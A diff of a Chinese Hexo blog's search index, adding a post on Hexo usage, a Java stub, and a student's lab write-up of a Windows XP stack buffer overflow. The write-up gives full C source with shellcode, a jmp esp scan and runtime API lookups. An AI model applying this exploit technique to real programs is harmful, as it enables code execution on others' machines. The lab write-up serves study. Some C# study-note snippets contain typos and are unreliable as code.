@@ -1,8 +1,97 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Hexo使用技巧</title>
+    <url>/hexo-test/Others/HexoUseskill/</url>
+    <content><![CDATA[<p>到头来仔细一想，反正什么都要写，为什么不把Hexo的标签做个记录呢~省的到时候每次用还得去官网扒拉^_^</p>
+<a id="more"></a>
+
+<h2 id="创建新文章"><a href="#创建新文章" class="headerlink" title="创建新文章"></a>创建新文章</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new [layout] &lt;title&gt; &#x2F;&#x2F;创建新的文章或者新页面</span><br><span class="line">						  &#x2F;&#x2F;:title	标题（小写，空格将会被替换为短杠）</span><br><span class="line">						&#x2F;&#x2F;:year	建立的年份，比如， 2015</span><br><span class="line">						&#x2F;&#x2F;:month	建立的月份（有前导零），比如， 04</span><br><span class="line">						&#x2F;&#x2F;:i_month	建立的月份（无前导零），比如， 4</span><br><span class="line">						&#x2F;&#x2F;:day	建立的日期（有前导零），比如， 07</span><br><span class="line">						&#x2F;&#x2F;:i_day	建立的日期（无前导零），比如， 7</span><br></pre></td></tr></table></figure>
+<h2 id="文章属性的设置-Front-matter"><a href="#文章属性的设置-Front-matter" class="headerlink" title="文章属性的设置(Front-matter)"></a>文章属性的设置(Front-matter)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">layout	布局	</span><br><span class="line">title	标题	文章的文件名</span><br><span class="line">date	建立日期	文件建立日期</span><br><span class="line">updated	更新日期	文件更新日期</span><br><span class="line">comments	开启文章的评论功能	true</span><br><span class="line">tags	标签（不适用于分页）	</span><br><span class="line">categories	分类（不适用于分页）	</span><br><span class="line">permalink	覆盖文章网址	</span><br><span class="line">keywords	仅用于 meta 标签和 Open Graph 的关键词（不推荐使用）</span><br></pre></td></tr></table></figure>
+<p>关于配置多个标签和分类的情况，可以使用类似</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tags:</span><br><span class="line">- tag1</span><br><span class="line">- tag2</span><br><span class="line">categories:</span><br><span class="line">- [Diary, PlayStation] &#x2F;&#x2F;Diary为父类,PlayStation为子类</span><br><span class="line">- [Diary, Games]</span><br><span class="line">- [Life]</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Others</category>
+      </categories>
+      <tags>
+        <tag>Others</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记病毒缓冲区溢出实验</title>
+    <url>/hexo-test/Information-Security-Study/Others/Virus/</url>
+    <content><![CDATA[<h1 id="1、缓冲区溢出"><a href="#1、缓冲区溢出" class="headerlink" title="1、缓冲区溢出"></a>1、缓冲区溢出</h1><h2 id="1-1缓冲区溢出条件："><a href="#1-1缓冲区溢出条件：" class="headerlink" title="1.1缓冲区溢出条件："></a>1.1缓冲区溢出条件：</h2><p>1.使用非类型安全的语言（C或者C++），当缓冲区操作时不对边界做出检查，WHAT？通俗的说就是strcpy，memcpy等串操作和内存块拷贝操作缓冲区时，大数据往小空间上拷贝，造成溢出。<br>2.函数调用时栈空间的布局为缓冲区溢出提供了条件</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E6%A0%88%E7%A9%BA%E9%97%B4%E5%B8%83%E5%B1%80.png" class title="栈空间布局">
+
+<p>当程序中函数被调用时，系统总是先将被调用函数所需的参数以逆序的方式入栈，然后将调用函数后面那条指令的地址（返回地址）入栈。随后控制转入被调用的函数去执行，程序一般在将需要保存的寄存器的值入栈后开始为被调用函数内的局部变量分配所需的存储空间，从而形成图示堆栈结构。<br>3.如上图，局部变量如果是字符串数组，在进行缓冲区空间分配时，栈内同样符合小端方式对齐的原则，即shellcode[0]在最低端地址上，shellcode[100]在高端地址上，由于被调函数的局部变量分配在返回地址EIP（附近如下图所示：），所以一旦发生溢出，EIP就会被覆盖掉，从而导致程序的运行流程发生变化。</p>
+<a id="more"></a>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86.png" class title="缓冲区溢出原理">
+
+<h2 id="结论"><a href="#结论" class="headerlink" title="结论:"></a>结论:</h2><p>由于程序缺少必要的边界检查，如果局部变量中有字符数组存在，只要赋予该数组的字符串足够长，就能将上面的返回地址覆盖掉。字符数组超出了开始为其分配的空间大小，缓冲区溢出就发生了。<br>精心构造溢出所用的字符串，将4个字节返回地址替换成别有用心的地址，当函数返回时，我们就能引导程序到我们指定的代码去执行，从而获得程序控制权。<br>如果地址A所指定的内存空间事先存放了设计好的攻击代码，那么攻击就会随之发生。</p>
+<h1 id="2、实例-用缓冲区溢出的方式打开记事本notepad"><a href="#2、实例-用缓冲区溢出的方式打开记事本notepad" class="headerlink" title="2、实例 (用缓冲区溢出的方式打开记事本notepad)#"></a>2、实例 (用缓冲区溢出的方式打开记事本notepad)#</h1><p><em>写在前面，本实例使用的是XP虚拟机</em></p>
+<p>1.建工程项目，C或者C++语言，我视频讲解里是VC++6.0写的，所以还是以此介绍。<br>首先建立控制台工程，然后新建C++文件。建立好工程文件后就可以写代码了。</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E5%88%9B%E5%BB%BA%E6%8E%A7%E5%88%B6%E5%8F%B0%E7%A8%8B%E5%BA%8F.png" class>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E5%88%9B%E5%BB%BAC++%E7%A8%8B%E5%BA%8F.png" class>
+<p>2.写代码，主函数很简单，仅调用一个test()函数，test函数2行代码就搞定了，用memcpy函数造缓冲区溢出，即大数据往小空间上拷贝，关键的问题是shellcode数组的构造，shellcode数组需要完成的功能是覆盖掉返回地址EIP后，转向攻击代码，即打开notepad.exe。<br>主函数仅调用test()函数，test函数就两行代码，只要shellcode的大小超过10，缓冲区溢出就发生了！</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void test()</span><br><span class="line">&#123;</span><br><span class="line">    char buffer[10];</span><br><span class="line">    memcpy(buffer,shellcode,sizeof(shellcode));</span><br><span class="line">&#125;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	test();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Shellcode构造：首先要理解到shellcode的功能，Shellcode是指能完成特殊任务的自包含的二进制代码，根据不同的任务可能是发出一条系统调用或建立一个高权限的Shell,  Shellcode因此得名。我们的实例中，shellcode就是要打开notepad.exe。所以如何构成这样的二进制代码，成为了关键，接触过OllyICE工具后，大家应该知道可以利用该调试工具构造二进制代码，仅需要写上对应的汇编语句。这里大家可以熟悉一下反汇编，push串对应68，push 立即数对应6A，WinExec函数地址为：7C8623AD,ExitProcess函数地址为7C81CAFA。<br> <img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E6%B1%87%E7%BC%96%E8%BD%AC%E4%BA%8C%E8%BF%9B%E5%88%B6.png" class><br>接下来已二进制的形式复制该段代码。粘贴到记事本上：</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%AE%B0%E4%BA%8B%E6%9C%AC.png" class>
+<p>然后将其书写成十六进制的样式就好了。</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6shellcode.png" class>
+<p>而后编译该程序，报错是肯定的，因为我们并不清楚栈内元素的情况</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E9%94%99%E8%AF%AF.png" class>
+<p>之后利用OllyICE进行调试</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/OllyICE%E5%B8%83%E5%B1%80.png" class>
+<p>将断点放在memcpy函数调用完成的返回地址上,观察堆栈区的情况.</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/memcpy%E5%87%BD%E6%95%B0.png" class>
+<p>F9跳转到改地址执行，观察堆栈区</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E5%A0%86%E6%A0%88%E5%8C%BA.png" class>
+<p>现在的情况是溢出已经发生，但没有控制好溢出后的函数返回地址，让其进入了一个不能读写的地址上去执行，所以报错！<br>唯一的办法就是去耐心的反复调试。本次调试前，请先加上一组0X90（对应汇编nop，即空操作），如下：</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E6%96%B0shellcode.png" class>
+<p>运行，报错，0X90909090不可读！继续调试，观察堆栈区情况，返回地址为0x90909090，我们需要改写该地址才能程序进入shellcode区执行，如何填写返回地址，填写内容及位置我们就必须精心计算！返回地址可以填写0012FF88，因为函数返回后跳转到0012FF88上去执行，是一串空操作，但之后就会进入我们写的打开记事本的shellcode 区！所以动手去试下这个位置改写为0012FF88，再运行程序！</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80.png" class>
+<p>观察shellcode区，Shellcode第一个有效字符为68，它之前有7个90，然后就是返回地址了，改写情况如下：</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E8%AE%B0%E4%BA%8B%E6%9C%ACshellcode.png" class>
+<p>一般来说应该是能正确执行的，执行的结果为打开本机的notepad程序</p>
+<h1 id="3、推而广之"><a href="#3、推而广之" class="headerlink" title="3、推而广之"></a>3、推而广之</h1><h2 id="3-1前言"><a href="#3-1前言" class="headerlink" title="3.1前言"></a>3.1前言</h2><p>显而易见的是这样的程序通用性很差，只能在本机执行，因为其他机器的堆栈区不一定是在0012FF88后布置攻击代码。以及shellcode里面填写的0X7C8623AD,0X7C81CAFA等数据分别是XP下的WinExec和ExitProcess的函数地址。那么如何解决shellcode硬编码的问题就成了解决程序兼容性的关键！</p>
+<h2 id="3-2兼容性解决"><a href="#3-2兼容性解决" class="headerlink" title="3.2兼容性解决"></a>3.2兼容性解决</h2><p><strong>第一步解决的问题是：不同机器布置攻击代码的位置不一样</strong><br>这里的解决方式是，观察函数返回后的ESP指针的情况：</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/ESP%E6%8C%87%E9%92%88.png" class>
+<p>观察后发现函数调用返回后栈顶指针的内容恰好为0012FF88，所以如果我们想进入到该地址执行，最后是用一条指令替代硬编码地址，Jmp esp指令可以为你解决该问题。Jmp esp指令对应的二进制码为FFE4，依旧是不同的系统动态链接库并不一样，所以这里也不能使用硬编码写死，简单粗暴的方法就是在本模块中找到FFE4，而不依赖于任何的模块，找到后还是把地址回填到shellcode对应位置上。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DWORD base &#x3D; 0x00400000;</span><br><span class="line">	while (1)</span><br><span class="line">	&#123;</span><br><span class="line">		if (*(WORD*)base &#x3D;&#x3D; 0xe4ff)</span><br><span class="line">			break;</span><br><span class="line">		base ++;</span><br><span class="line">	&#125;</span><br><span class="line">	*(DWORD*)&amp;shellcode[16] &#x3D; base; &#x2F;&#x2F;这里的shellcode[16]根据自己的实际情况回填，他会用查询到的数据替换掉原来的数据</span><br></pre></td></tr></table></figure>
+<p>剩下的WinExec和ExitProcess函数也就依葫芦画瓢，利用LoadLibrary和GetProcAddress函数来获取了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DWORD a1 &#x3D; (DWORD)GetProcAddress(LoadLibrary(&quot;kernel32.dll&quot;),&quot;WinExec&quot;);</span><br><span class="line">DWORD a2 &#x3D; (DWORD)GetProcAddress(LoadLibrary(&quot;kernel32.dll&quot;),&quot;ExitProcess&quot;);</span><br><span class="line">*(DWORD*)(shellcode+46) &#x3D; a1; &#x2F;&#x2F;同样的，shellcode后面的数字根据实际情况来填</span><br><span class="line">*(DWORD*)(shellcode+55) &#x3D; a2;</span><br></pre></td></tr></table></figure>
+<p>三个硬编码地址处理后，程序通用性就很好了，可以在多个版本操作系统上正常执行！</p>
+<h1 id="4、后记"><a href="#4、后记" class="headerlink" title="4、后记"></a>4、后记</h1><p>先附上试验成功的代码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">char shellcode[]&#x3D;</span><br><span class="line">&#123; &#x2F;&#x2F;定义一个全局变量</span><br><span class="line">	0x90,0x90,0x90,0x90,</span><br><span class="line">	0x90,0x90,0x90,0x90,</span><br><span class="line">	0x90,0x90,0x90,0x90,</span><br><span class="line">	0x90,0x90,0x90,0x90,</span><br><span class="line">	0x90,0x90,0x90,0x90, &#x2F;&#x2F;0x34,0xFF,0x12,0x00,这里填的本来是一开始打开notepad的返回地址</span><br><span class="line">	0x90,0x90,0x90,0x90, &#x2F;&#x2F;24</span><br><span class="line">	0x90,0x90,0x90,</span><br><span class="line"></span><br><span class="line">	0x68,0x65,0x00,0x00,0x00,</span><br><span class="line">	0x68,0x6E,0x2E,0x65,0x78,</span><br><span class="line">	0x68,0x61,0x6F,0x72,0x61,</span><br><span class="line">	0x68,0x65,0x6E,0x67,0x68,</span><br><span class="line">	0x68,0x63,0x3A,0x2F,0x64, &#x2F;&#x2F;这一段是名字全拼.exe的十六进制编码</span><br><span class="line"></span><br><span class="line">	0x6A,0x01,0x8B, &#x2F;&#x2F;31</span><br><span class="line">	0xC4,0x83,0xC0,0x04,</span><br><span class="line">	0x50,0xB8,0x90,0x90,</span><br><span class="line">	0x90,0x90,0xFF,0xD0,</span><br><span class="line">	0x6A,0x00,0xB8,0x90,</span><br><span class="line">	0x90,0x90,0x90,0xFF,0xD0 &#x2F;&#x2F;21，两个0xFF前面四个字节都是相应的函数地址</span><br><span class="line">&#125;;</span><br><span class="line">void test()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    char buffer[10];</span><br><span class="line">    memcpy(buffer,shellcode,sizeof(shellcode)); &#x2F;&#x2F;memcpy缓冲区溢出常用函数，即大数据往小空间上拷贝</span><br><span class="line">&#125;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	DWORD base &#x3D; 0x00400000;</span><br><span class="line">	while (1)</span><br><span class="line">	&#123;</span><br><span class="line">		if (*(WORD*)base &#x3D;&#x3D; 0xe4ff) &#x2F;&#x2F;在本地查找0xE4FF,也就是jmp ESP指令的地址</span><br><span class="line">			break;</span><br><span class="line">		base ++;</span><br><span class="line">	&#125;</span><br><span class="line">	*(DWORD*)&amp;shellcode[16] &#x3D; base; &#x2F;&#x2F;保存到shellcode里面替换手动输入的返回地址</span><br><span class="line"></span><br><span class="line">	DWORD a1 &#x3D; (DWORD)GetProcAddress(LoadLibrary(&quot;kernel32.dll&quot;),&quot;WinExec&quot;);</span><br><span class="line">	DWORD a2 &#x3D; (DWORD)GetProcAddress(LoadLibrary(&quot;kernel32.dll&quot;),&quot;ExitProcess&quot;);</span><br><span class="line">	*(DWORD*)(shellcode+61) &#x3D; a1;</span><br><span class="line">	*(DWORD*)(shellcode+70) &#x3D; a2; &#x2F;&#x2F;动态获取，然后回填</span><br><span class="line">	test();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个实验真的做的脑壳疼，本来人就菜，做这个还得东找西造，累的不要不要的。不过也坚定了我做东西要记录的想法，不然到时候真的记不住，太操蛋了-_^</p>
+]]></content>
+      <categories>
+        <category>Information Security Study</category>
+        <category>Others</category>
+      </categories>
+      <tags>
+        <tag>Virus</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java从入门到入土</title>
+    <url>/hexo-test/Information-Security-Study/Code-Language/Java/Java/</url>
+    <content><![CDATA[<img data-src="/hexo-test/Information-Security-Study/Code-Language/Java/Java/Java%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE.png" class title="Java思维导图">
+<h1 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h1><a id="more"></a>]]></content>
+      <categories>
+        <category>Information Security Study</category>
+        <category>Code Language</category>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>C＃学习笔记</title>
-    <url>/hexo-test/Game/C%EF%BC%83-StudyNote/</url>
+    <url>/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/</url>
     <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><p>C#程是利用命名空间组织起来的。如果要调用某个命名空间的额类或者方法，则需要用 using 引入命名空间<br>    *using 指令的基本形式：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using 命名空间名;*</span><br></pre></td></tr></table></figure>
 <p>当使用命名空间内的类时 （如一个N1的命名空间有一个类A中有一个方法Myls），需要实例化这个类</p>
@@ -15,7 +104,7 @@
 
 <h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p>类是一种数据结构，他可以封装数据成员、函数成员和其他的类。C#中的所有语句都必须位于类内。使用任何新的类之前都必须声明它，一个类一旦被声明，就可以当做一种新的类型来使用。在C#中通过class关键字来声明。<br>实例：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class MyClass</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h2><img data-src="/hexo-test/Game/C%EF%BC%83-StudyNote/Main1.png" class>
+<h2 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h2><img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/Main1.png" class>
 
 
 <h2 id="标识符及关键字"><a href="#标识符及关键字" class="headerlink" title="标识符及关键字"></a>标识符及关键字</h2><p>标识符命名规则：<br>要注意的是C#的标识符只能由数字、字母和下划线组成，并且必须以字符或者下划线开头。<font color="red">在对类、变量、方法等进行命名时，应避免与标识符和关键字重名，否则可能导致所编写的程序中响应的引用出现未知的错误。</font></p>
@@ -36,17 +125,17 @@
 <ul>
 <li>如果需要使用float类型的变量，必须在数值的后面紧跟f或F，否则编译器将将其作为double类型的变量处理，也可以在double类型变量的前面加上（float）对其进行强制转换。</li>
 </ul>
-<h3 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h3> <img data-src="/hexo-test/Game/C%EF%BC%83-StudyNote/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B.png" class title="引用类型">
- <img data-src="/hexo-test/Game/C%EF%BC%83-StudyNote/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B1.png" class title="引用类型">
+<h3 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h3> <img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B.png" class title="引用类型">
+ <img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B1.png" class title="引用类型">
 
 <p>实例（创建一个类C，并在类中建立一个字段Value，并初始化为0。然后在程序的其他地方通过new创建该类的引用类型变量）：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Program</span><br><span class="line">&#123;</span><br><span class="line">	class C		&#x2F;&#x2F;创建一个类C</span><br><span class="line">	&#123;</span><br><span class="line">		public int Value &#x3D;0;		&#x2F;&#x2F;声明一个公共int类型的变量Value</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	static void Main (string[] args)</span><br><span class="line">	&#123;</span><br><span class="line">		int v1 &#x3D;0;		&#x2F;&#x2F;声明一个int类型变量v1，赋初值为0</span><br><span class="line">		int v2 &#x3D;v1;		&#x2F;&#x2F;声明一个int类型变量v2，并将v1的值赋给v2</span><br><span class="line">		v2 &#x3D; 927;		&#x2F;&#x2F;将v2的值更改为927</span><br><span class="line">		C r1 &#x3D; new C();		&#x2F;&#x2F;使用new关键字创建引用对象</span><br><span class="line">		C r2 &#x3D;r1;			&#x2F;&#x2F;是r1等于r2</span><br><span class="line">		r2.Value &#x3D; 112;		&#x2F;&#x2F;设置r2的Value值</span><br><span class="line">		Console.WriteLine(“Value:&#123;0&#125;,&#123;1&#125;”,v1,v2);		&#x2F;&#x2F;输出v1和v2</span><br><span class="line">		Console.WriteLine(“Refs:&#123;0&#125;,&#123;1&#125;”,r1.Value,r2.Value);		&#x2F;&#x2F;输出引用类型对象的Value值</span><br><span class="line">		Console.ReadLine();</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<img data-src="/hexo-test/Game/C%EF%BC%83-StudyNote/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%E5%AE%9E%E4%BE%8B%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C.png" class title="结果">
+<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%E5%AE%9E%E4%BE%8B%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C.png" class title="结果">
 
 <h3 id="值类型和引用类型的区别"><a href="#值类型和引用类型的区别" class="headerlink" title="值类型和引用类型的区别"></a>值类型和引用类型的区别</h3><p>实例：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line"></span><br><span class="line">namespace ConsoleApp1_Cxiapu</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">		class Program</span><br><span class="line">		&#123;</span><br><span class="line">			static void Main(string[] args)</span><br><span class="line">			&#123;</span><br><span class="line">				ReferenceAndValue.Demonstration();      &#x2F;&#x2F;调用类中的方法</span><br><span class="line">				Console.ReadLine();</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		public class stamp</span><br><span class="line">		&#123;</span><br><span class="line">			public string Name &#123; get; set; &#125;        &#x2F;&#x2F;定义引用类型</span><br><span class="line">			public int Age &#123; get; set; &#125;        &#x2F;&#x2F;定义值类型</span><br><span class="line">		&#125;</span><br><span class="line">		public static class ReferenceAndValue</span><br><span class="line">		&#123;</span><br><span class="line">			public static void Demonstration()</span><br><span class="line">			&#123;</span><br><span class="line">				stamp Stamp_1 &#x3D; new stamp &#123; Name &#x3D; &quot;Premiere&quot;, Age &#x3D; 25 &#125;;      &#x2F;&#x2F;实例化</span><br><span class="line">				stamp Stamp_2 &#x3D; new stamp &#123; Name &#x3D; &quot;Again&quot;, Age &#x3D; 47 &#125;;     &#x2F;&#x2F;实例化</span><br><span class="line">				int age &#x3D; Stamp_1.Age;      &#x2F;&#x2F;获取值类型Age的值</span><br><span class="line">				Stamp_1.Age &#x3D; 22;       &#x2F;&#x2F;修改值类型的值</span><br><span class="line">				stamp guru &#x3D; Stamp_2;       &#x2F;&#x2F;获取Stamp_2中的值</span><br><span class="line">				Stamp_2.Name &#x3D; &quot;Again Amend&quot;;       &#x2F;&#x2F;修改引用的Name值</span><br><span class="line">				Console.WriteLine(&quot;Stamp_1&#39;s age:&#123;0&#125;&quot;, Stamp_1.Age);       &#x2F;&#x2F;显示Stamp_1中的Age值</span><br><span class="line">				Console.WriteLine(&quot;age’s value:&#123;0&#125;&quot;, age);       &#x2F;&#x2F;显示age的值</span><br><span class="line">				Console.WriteLine(&quot;Stamp_2’s name:&#123;0&#125;&quot;, Stamp_2.Name);      &#x2F;&#x2F;显示Stamp_2中的Name值</span><br><span class="line">				Console.WriteLine(&quot;guru’s name:&#123;0&#125;&quot;, guru.Name);     &#x2F;&#x2F;显示guru中的Name值</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
 
-<img data-src="/hexo-test/Game/C%EF%BC%83-StudyNote/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%80%BC%E7%B1%BB%E5%9E%8B%E5%8C%BA%E5%88%AB.png" class title="结果">
+<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%80%BC%E7%B1%BB%E5%9E%8B%E5%8C%BA%E5%88%AB.png" class title="结果">
 
 
 
@@ -64,8 +153,8 @@
 <ul>
 <li>说明：<font size="1.5">在右移时,如果第一个操作数为int或uint (32位数),则移位数由第二个操作数的低5· 位给出;如果第一个操作数为long或ulong (64位数),则移位数由第二个操作数的低6位给出;如果第一个操作数为int或long,则右移位是算术移位(高序空位设置为符号位),如果第一个操作数为uint或ulong类型,则右移位是逻辑移位(高位填充0).</font></li>
 </ul>
-<h2 id="字符类Char的使用"><a href="#字符类Char的使用" class="headerlink" title="字符类Char的使用"></a>字符类Char的使用</h2><img data-src="/hexo-test/Game/C%EF%BC%83-StudyNote/Char'suse1.png" class>
-<img data-src="/hexo-test/Game/C%EF%BC%83-StudyNote/Char'suse2.png" class>
+<h2 id="字符类Char的使用"><a href="#字符类Char的使用" class="headerlink" title="字符类Char的使用"></a>字符类Char的使用</h2><img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/Char'suse1.png" class>
+<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/Char'suse2.png" class>
 
 
 
@@ -84,15 +173,15 @@
 <p>3、 Format方法（格式化字符串，用于将字符串格式化成为指定的格式）</p>
 <p>实例：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">	string Str1&#x3D;”11”;</span><br><span class="line">	string Str2&#x3D;”22”;</span><br><span class="line">	string NewStr&#x3D;String.Format&#123;“&#123;0&#125;,&#123;1&#125;!!”,Str1,Str2&#125;;		&#x2F;&#x2F;格式化字符串（此处应注意的是定义字符类型时使用的是string，而调用方法时使用的是String类，S大写）</span><br><span class="line">	Console.WriteLine(NewStr);		&#x2F;&#x2F;输出结果为11,22！！</span><br><span class="line">	Console.ReadLine(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<img data-src="/hexo-test/Game/C%EF%BC%83-StudyNote/Date'sRule.png" class>
+<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/Date'sRule.png" class>
 
 <p>实例：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">	DateTime dt &#x3D;DateTime.Now;		&#x2F;&#x2F;定义DateTime类型的变量，并获取当前的系统时间</span><br><span class="line">	string Str1 &#x3D; String.Format(“&#123;0:D&#125;”,dt);		&#x2F;&#x2F;将获取的系统时间格式化为YYYY年MM月dd日</span><br><span class="line">	Console.WiteLine(Str1)</span><br><span class="line">	Console.ReadLine();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>运行结果：</p>
-<img data-src="/hexo-test/Game/C%EF%BC%83-StudyNote/Format1.png" class> 
+<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/Format1.png" class> 
 
 <p>如果不格式化（//string Str1 = String.Format(“{0:D}”,dt);）运行的结果为：</p>
-<img data-src="/hexo-test/Game/C%EF%BC%83-StudyNote/Format2.png" class> 
+<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/Format2.png" class> 
 
 <p>4、 Substring(截取字符串)<br>实例：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">	string Str1 &#x3D; “abcdef”;</span><br><span class="line">	string Str2 &#x3D; “”;		&#x2F;&#x2F;定义字符串，string类型的是引用类型，必须赋初值</span><br><span class="line">	Str2 &#x3D; Str1.Substring(1,4);		&#x2F;&#x2F;截取字符串，代表将Str1从第二位字符开始截取四位字符</span><br><span class="line">	Console.WriteLine(Str2);		&#x2F;&#x2F;输出结果将会是bcde</span><br><span class="line">	Console.ReadLine();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -103,15 +192,19 @@
 <p>实例：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">	string Str1 &#x3D; “ab^cd#e,fg”</span><br><span class="line">	char[] sep &#x3D; &#123;‘^’,’#’,’,’&#125;;		&#x2F;&#x2F;声明分隔字符的数组</span><br><span class="line">	String[] sepstring &#x3D; new String[100];		&#x2F;&#x2F;声明一个字符串数组</span><br><span class="line">	sepstring &#x3D; Str1.Solit(sep);		&#x2F;&#x2F;作分割处理</span><br><span class="line">	for (int i&#x3D;0;i&lt;sepstring.Length.i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Console.WriteLine(“item&#123;0&#125;:&#123;1&#125;”,I,sepstring[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	Console.ReadLine();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>运行结果为：</p>
-<img data-src="/hexo-test/Game/C%EF%BC%83-StudyNote/SplitRun1.png" class>
+<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/SplitRun1.png" class>
 
 <p>Split会将所有被指定字符分隔的字符串全部分离，例如<br>string Str1 = “ab^c#d^ef,g”;若将源字符串这样赋值<br>char[] sep = { ‘^’, ‘#’, ‘,’ };分隔字符串不变<br>将输出：</p>
-<img data-src="/hexo-test/Game/C%EF%BC%83-StudyNote/SplitRun2.png" class>
